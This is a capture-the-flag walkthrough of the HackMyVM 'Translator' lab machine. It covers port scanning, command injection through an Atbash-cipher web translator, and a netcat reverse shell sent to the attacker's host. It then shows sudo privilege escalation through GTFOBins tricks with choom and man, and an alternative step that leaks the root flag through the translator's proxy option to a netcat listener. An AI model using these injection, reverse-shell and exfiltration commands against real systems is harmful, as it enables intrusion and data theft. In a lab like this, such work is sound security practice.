# CTF Penetration Testing

## HackMyVM

### Translator - Machine

#### Machine Description

- Machine name: [Translator](https://hackmyvm.eu/machines/machine.php?vm=Translator)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Translator Machine Logo" width="150"/>

#### Tools Used

- crackmapexec (impacket)
- curl
- Gobuster
- Netcat
- Nmap
- pwncat-cs
- smbclient
- WhatWeb

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.138 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.138`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 16:05 CEST
Nmap scan report for 192.168.56.138
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
MAC Address: 08:00:27:EA:DE:B2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.68 seconds
```

`whatweb -a 3 -v http://192.168.56.138`:
```
WhatWeb report for http://192.168.56.138
Status    : 200 OK
Title     : <None>
IP        : 192.168.56.138
Country   : RESERVED, ZZ

Summary   : HTML5, HTTPServer[nginx/1.18.0], nginx[1.18.0]

Detected Plugins:
[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : nginx/1.18.0 (from server string)

[ nginx ]
        Nginx (Engine-X) is a free, open-source, high-performance 
        HTTP server and reverse proxy, as well as an IMAP/POP3 
        proxy server. 

        Version      : 1.18.0
        Website     : http://nginx.net/

HTTP Headers:
        HTTP/1.1 200 OK
        Server: nginx/1.18.0
        Date: Thu, 10 Oct 2024 14:06:41 GMT
        Content-Type: text/html
        Last-Modified: Wed, 11 May 2022 08:29:11 GMT
        Transfer-Encoding: chunked
        Connection: close
        ETag: W/"627b73d7-122"
        Content-Encoding: gzip
```

`curl -s http://192.168.56.138`:
```                          
<!DOCTYPE html>
<html>
<body>

<h1>HMV Translator</h1>
<form action="/translate.php">
  <textarea id="hmv" name="hmv" rows="4" cols="50">Translate to...</textarea>
  <br>
  <input type="submit" value="Submit">
</form>
<p>Click the "Submit" button to translate the text!</p>
</body>
</html>
```

`curl -s "http://192.168.56.138/translate.php?hmv=test"`:
```
Translated to:<br>gvhg ←
gvtg
```

`curl -s "http://192.168.56.138/translate.php?hmv=aaa"`:
```
Translated to:<br>zzz ←
zzz
```

`curl -s "http://192.168.56.138/translate.php?hmv=zzz"`:
```
Translated to:<br>aaa ←
aaa
```

`curl -s "http://192.168.56.138/translate.php?hmv=id"`:
```
Translated to:<br>rw ←
rw
```

`curl -s "http://192.168.56.138/translate.php?hmv=rw"`:
```
Translated to:<br>id ←
id
```

`curl -s http://192.168.56.138/translate.php?hmv=rw;rw`:
```
Translated to:<br>id;id
id
uid=33(www-data) gid=33(www-data) groufs=33(www-data) ←
```

`vim ./translator.py`:
```python
#!/usr/bin/python3

def translate_char(c):
    if 'a' <= c <= 'z':  # Check if the character is a lowercase letter
        return chr(ord('z') - (ord(c) - ord('a')))
    else:
        return c  # Leave the character unchanged if it's not a lowercase letter

def translate_string(s):
    return ''.join(translate_char(c) for c in s)

# Input from the user
input_string = input("Enter a string: ")
# Apply the translation
translated_string = translate_string(input_string)

# Print the result
print("Translated string:", translated_string)
```

`chmod u+x ./translator.py`

`./translator.py`:
```          
Enter a string: nc -e /bin/bash 192.168.56.118 4444
Translated string: mx -v /yrm/yzhs 192.168.56.118 4444
```

`pwncat-cs -lp 4444`:
```
[13:13:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

```
cmd='mx -v /yrm/yzhs 192.168.56.118 4444;mx -v /yrm/yzhs 192.168.56.118 4444'; \
encoded_cmd=$(printf %s "$cmd" | jq -s -R -r @uri); \
curl "http://192.168.56.138/translate.php?hmv=$encoded_cmd";
```

```
[13:40:40] received connection from 192.168.56.137:58474 ←
[13:40:41] 192.168.56.135:58474: registered new host w/ db
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
www-data ←
```

`id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uname -a`:
```
Linux translator 5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /var/www/html`

`ls -alps ./`:
```
total 20
4 drwxr-xr-x 2 www-data www-data 4096 May 11  2022 ./
4 drwxr-xr-x 3 root     root     4096 May 11  2022 ../
4 -rw-r--r-- 1 www-data www-data   24 May 11  2022 hvxivg ←
4 -rw-r--r-- 1 www-data www-data  290 May 11  2022 index.html
4 -rw-r--r-- 1 www-data www-data  258 May 11  2022 translate.php
```

`file ./hvxivg`:
``` 
hvxivg: ASCII text ←
```

`cat ./hvxivg`:
```
Mb kzhhdliw rh zbfie3w4
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`./translator.py`:
```
Enter a string: Mb kzhhdliw rh zbfie3w4
Translated string: My password is ayurv3d4 ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`cat /etc/passwd | grep "bash"`:
```
root:x:0:0:root:/root:/bin/bash
ocean:x:1000:1000:ocean,,,:/home/ocean:/bin/bash
india:x:1001:1001:,,,:/home/india:/bin/bash
```

`ls -l /home`:
```
total 8
drwxr-xr-x 2 india india 4096 May 11  2022 india
drwxr-xr-x 3 ocean ocean 4096 May 11  2022 ocean ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ssh ocean@192.168.56.138`:
```
ocean@192.168.56.138's password: ←
Linux translator 5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct 10 18:19:20 2024 from 192.168.56.118
```

![Victim: ocean](https://img.shields.io/badge/Victim-ocean-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
ocean ←
```

`id`:
```
uid=1000(ocean) gid=1000(ocean) grupos=1000(ocean),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

`cd /home/ocean`

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 3 ocean ocean 4096 may 11  2022 ./
4 drwxr-xr-x 4 root  root  4096 may 11  2022 ../
0 lrwxrwxrwx 1 ocean ocean    9 may 11  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 ocean ocean  220 may 11  2022 .bash_logout
4 -rw-r--r-- 1 ocean ocean 3526 may 11  2022 .bashrc
4 drwxr-xr-x 3 ocean ocean 4096 may 11  2022 .local/
4 -rw-r--r-- 1 ocean ocean  807 may 11  2022 .profile
4 -rw------- 1 ocean ocean   20 may 11  2022 user.txt ←
4 -rw------- 1 ocean ocean   56 may 11  2022 .Xauthority
```

`cat ./user.txt`:
```
a6765hftgnhvugy473f ←
```

`sudo -l`:
```
Matching Defaults entries for ocean on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ocean may run the following commands on translator:
    (india) NOPASSWD: /usr/bin/choom ←
```

`file /usr/bin/choom`:
```
/usr/bin/choom: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cadcb44786665809e672e136da9f8c6fd032b2e, for GNU/Linux 3.2.0, stripped
```

<div>
	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
</div>

[choom](https://gtfobins.github.io/gtfobins/choom/)

[**#Sudo**]

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
sudo choom -n 0 /bin/sh
```

![Victim: ocean](https://img.shields.io/badge/Victim-ocean-64b5f6?logo=linux&logoColor=white)

`sudo -u india choom -n 0 /bin/sh`

![Victim: india](https://img.shields.io/badge/Victim-india-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
india ←
```

`sudo -l`:
```
Matching Defaults entries for india on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User india may run the following commands on translator:
    (root) NOPASSWD: /usr/local/bin/trans ←
```

`/usr/local/bin/trans --help`:
```
Usage:  trans [OPTIONS] [SOURCES]:[TARGETS] [TEXT]...

Information options:
    -V, -version
        Print version and exit.
    -H, -help
        Print help message and exit.
    -M, -man
        Show man page and exit. ←
    -T, -reference
        Print reference table of languages and exit.
    -R, -reference-english
        Print reference table of languages (in English names) and exit.
    -L CODES, -list CODES
        Print details of languages and exit.
    -S, -list-engines
        List available translation engines and exit.
    -U, -upgrade
        Check for upgrade of this program.

[...]
```

<div>
	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
</div>

[man](https://gtfobins.github.io/gtfobins/man/)

[**#Sudo**]

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
sudo man man
!/bin/sh
```

![Victim: india](https://img.shields.io/badge/Victim-india-64b5f6?logo=linux&logoColor=white)

`sudo /usr/local/bin/trans -M`

```
!bash
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 24
4 drwx------  3 root root 4096 may 11  2022 ./
4 drwxr-xr-x 18 root root 4096 may 11  2022 ../
0 lrwxrwxrwx  1 root root    9 may 11  2022 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 may 11  2022 .local/
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   20 may 11  2022 root.txt ←
```

`cat ./root.txt`:
```
h87M5364V2343ubvgfy ←
```

<🔄 Alternative Step.>

![Victim: india](https://img.shields.io/badge/Victim-india-64b5f6?logo=linux&logoColor=white)

`/usr/local/bin/trans --help`:
```
[...]

Networking options:
    -x HOST:PORT, -proxy HOST:PORT
        Use HTTP proxy on given port. ←
    -u STRING, -user-agent STRING
        Specify the User-Agent to identify as.
    -4, -ipv4, -inet4-only
        Connect only to IPv4 addresses.
    -6, -ipv6, -inet6-only
        Connect only to IPv6 addresses.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 80 > ./http_root.txt`:
```
listening on [any] 80 ... ←
```

![Victim: india](https://img.shields.io/badge/Victim-india-64b5f6?logo=linux&logoColor=white)

`sudo /usr/local/bin/trans -i /root/root.txt -x 192.168.56.118:80`:
```
[ERROR] Null response.
[ERROR] Oops! Something went wrong and I can't translate it for you :(
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.138] 39469 ←
```

`cat ./http_root.txt`
```
GET http://translate.googleapis.com/translate_a/single?client=gtx&ie=UTF-8&oe=UTF-8&dt=bd&dt=ex&dt=ld&dt=md&dt=rw&dt=rm&dt=ss&dt=t&dt=at&dt=gt&dt=qca&sl=auto&tl=es&hl=es&q=%68%38%37%4D%35%33%36%34%56%32%33%34%33%75%62%76%67%66%79 HTTP/1.1 ←
Host: translate.googleapis.com
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
```

```
encoded_root='%68%38%37%4D%35%33%36%34%56%32%33%34%33%75%62%76%67%66%79'; \
decoded_root=$(printf "$(echo $encoded_root | sed 's/%/\\x/g')"); \
echo $decoded_root;
```
```
h87M5364V2343ubvgfy ←
```

</🔄 Alternative Step.>

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
